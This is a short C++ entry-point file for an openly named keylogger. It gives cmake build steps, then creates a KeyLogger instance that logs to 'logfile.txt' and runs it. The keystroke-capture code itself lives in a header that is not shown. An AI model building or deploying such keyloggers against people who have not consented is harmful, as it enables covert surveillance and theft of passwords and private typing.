#include "KeyLogger.hpp"
#include <iostream>

// cmake -B build
// cmake --build build
int main()
{
    // Defining log file path
    std::string logFilePath = "logfile.txt";
    
    // Create instance of the KeyLogger
    KeyLogger keyLogger(logFilePath);

    // Run the instance
    keyLogger.run();
    return 0;
}